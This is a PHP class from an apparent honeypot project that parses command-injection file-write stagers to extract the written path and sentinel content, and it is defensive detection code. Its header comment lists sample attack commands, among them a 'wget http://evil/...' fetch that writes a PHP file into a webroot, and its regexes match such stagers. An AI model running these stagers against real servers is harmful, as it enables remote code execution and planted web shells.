<?php

declare(strict_types=1);

namespace Funnypot\App\Storage;

/**
 * FP-0467 Phase 2a: a PURE parser that turns a file-write cmdi stager into the (path, content) a scanner
 * expects to read back. Scanners confirm semi-blind RCE by writing a sentinel to a webroot file and then
 * fetching it:
 *   echo VULN123 > /var/www/html/out.txt        (literal content — the dominant verify technique)
 *   printf VULN123 > ./check.html
 *   echo VULN123 | tee /var/www/html/t.txt
 *   id > /var/www/html/rce.txt                   (command OUTPUT — content unknown statically)
 *   wget http://evil/x -O /var/www/html/c.php    (remote fetch — content unknown)
 *
 * Returns the written PATH always (so the capture hook can record a hit), and the literal CONTENT only
 * when the stager embeds it (echo/printf/tee of a literal) — the case where the honeypot can serve the
 * scanner's own sentinel back and "confirm" the write. For command-output / remote-fetch redirects the
 * content is null (the serve hook then fabricates a plausible 200, or defers to the command oracle).
 *
 * PURE + bounded: no I/O, no state, no reflection, input + content length-capped, single-line anchored
 * (no catastrophic backtracking). Path canonicalisation (PathCanon) + the actual capture/serve wiring are
 * the HoneypotController integration (phase 2b/3); this only extracts.
 */
final class WriteRedirectExtractor
{
    public const KIND_LITERAL = 'literal';  // content captured (echo/printf/tee of a literal)
    public const KIND_DYNAMIC = 'dynamic';  // path only — command output or a remote fetch

    private const MAX_INPUT = 8192;
    private const MAX_CONTENT = 4096;
    private const MAX_PATH = 1024;

    /**
     * @return array{path:string,content:?string,kind:string}|null null when no file-write redirect is present
     */
    public static function extract(string $command): ?array
    {
        if ($command === '') {
            return null;
        }
        $command = \substr($command, 0, self::MAX_INPUT);

        // echo/printf <content> > path  |  echo/printf <content> >> path
        // content is an optionally-quoted run up to the redirect operator.
        if (\preg_match('~\b(?:echo|printf)\s+(?:-[a-zA-Z]+\s+)?(?P<content>"[^"]{0,8192}"|\'[^\']{0,8192}\'|[^>|]{1,8192}?)\s*>>?\s*(?P<path>"[^"]{1,1024}"|\'[^\']{1,1024}\'|[^\s;&|>]{1,1024})~s', $command, $m) === 1) {
            return self::literal($m['content'], $m['path']);
        }

        // echo/printf <content> | tee [-a] path
        if (\preg_match('~\b(?:echo|printf)\s+(?P<content>"[^"]{0,8192}"|\'[^\']{0,8192}\'|[^|]{1,8192}?)\|\s*tee\s+(?:-a\s+)?(?P<path>"[^"]{1,1024}"|\'[^\']{1,1024}\'|[^\s;&|>]{1,1024})~s', $command, $m) === 1) {
            return self::literal($m['content'], $m['path']);
        }

        // curl/wget ... -o/-O path   (remote fetch — content unknown)
        if (\preg_match('~\b(?:curl|wget)\b[^;&|]{0,512}?\s-[oO]\s+(?P<path>[^\s;&|>]{1,1024})~s', $command, $m) === 1) {
            return self::dynamic($m['path']);
        }

        // generic `<cmd> > path` (command output redirect — content unknown)
        if (\preg_match('~(?:^|[;&|])\s*[^\s;&|>]+(?:\s+[^>;&|]{0,512})?\s>>?\s*(?P<path>[^\s;&|>]{1,1024})~s', $command, $m) === 1) {
            return self::dynamic($m['path']);
        }

        return null;
    }

    /** @return array{path:string,content:?string,kind:string}|null */
    private static function literal(string $content, string $path): ?array
    {
        $path = self::cleanPath($path);
        if ($path === null) {
            return null;
        }
        $content = \trim($content);
        // Strip one layer of matching surrounding quotes.
        if (\strlen($content) >= 2) {
            $q = $content[0];
            if (($q === '"' || $q === "'") && \substr($content, -1) === $q) {
                $content = \substr($content, 1, -1);
            }
        }

        return ['path' => $path, 'content' => \substr($content, 0, self::MAX_CONTENT), 'kind' => self::KIND_LITERAL];
    }

    /** @return array{path:string,content:?string,kind:string}|null */
    private static function dynamic(string $path): ?array
    {
        $path = self::cleanPath($path);

        return $path === null ? null : ['path' => $path, 'content' => null, 'kind' => self::KIND_DYNAMIC];
    }

    private static function cleanPath(string $path): ?string
    {
        $path = \trim($path, " \t\"'");
        if ($path === '' || \strlen($path) > self::MAX_PATH) {
            return null;
        }
        // Must look like a filesystem path (absolute, ./relative, or a bare filename with an extension) —
        // not a stray operand. Guards the generic redirect arm against matching non-path tokens.
        if (\preg_match('~^(?:/|\./|\.\./|\~/|[\w.-]+/)~', $path) === 1 || \preg_match('~^[\w.-]+\.[A-Za-z0-9]{1,8}$~', $path) === 1) {
            return $path;
        }

        return null;
    }
}
